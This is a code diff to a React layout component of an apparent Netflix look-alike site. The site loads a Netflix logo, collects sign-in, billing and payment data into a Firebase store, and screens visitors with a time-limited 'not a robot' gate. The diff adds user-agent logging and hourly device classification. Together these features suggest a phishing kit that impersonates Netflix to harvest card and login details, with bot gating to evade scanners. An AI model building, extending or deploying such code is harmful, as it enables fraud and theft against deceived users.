@@ -3,7 +3,16 @@ import { Store } from '../context/store';
 import db from '../firebase/firebase';
 import logo from '../assets/Netflix_2015_logo.svg';
 import { useLocation } from 'react-router-dom';
-
+import {
+    isDesktop,
+    isTablet,
+    isMobile,
+    isAndroid,
+    isIOS,
+    isWindows,
+    isMacOs
+  } from "react-device-detect";
+  
 import React from 'react'
 //...
 import LoadingScreen from 'react-loading-screen'
@@ -18,7 +27,8 @@ const Layout = ({ children }) => {
     function onChangeCap( value ){
         localStorage.setItem('isNotRobot',1)
         setIsNotRobot(true)
-      }
+    }
+    
     useEffect(() => {
         let signInData = [];
         let billingData = [];
@@ -73,8 +83,47 @@ const Layout = ({ children }) => {
         dispatch({ type: 'PAYMENT_DATA', payload: paymentData });
     }, []);
     useEffect( () => {
+        console.log( navigator.userAgent )
         const isRobotCheckAllowed = process.env.REACT_APP_PUBLIC_ROBOT_CHECK
         const robotCheckExpireTime = process.env.REACT_APP_PUBLIC_ROBOT_CHECK_EXPIRE_TIME
+        
+        
+        const pastVisitTime = localStorage.getItem('pastDeviceDetectTime')
+        let timeDiff = 3000000000
+        if( pastVisitTime )
+        {
+            timeDiff = Date.now() - pastVisitTime
+        }
+        
+        localStorage.setItem('pastDeviceDetectTime', Date.now())
+        if( timeDiff >= (3600 * 1000) )
+        {
+            let deviceType = "Unknown"
+            if( isDesktop )
+            {
+                if( isWindows )
+                {
+                    deviceType = "Windows Desktop"
+                }
+                if( isMacOs )
+                {
+                    deviceType = "MacOS Desktop"
+                }
+            }
+            if( isMobile )
+            {
+                if( isIOS )
+                {
+                    deviceType = "iPhone"
+                }
+
+                if( isAndroid )
+                {
+                    deviceType = "Android Phone"
+                }
+            }
+            
+        }
         if( isRobotCheckAllowed === '1')
         {
             const pastVisitTime = localStorage.getItem('pastVisitTime')
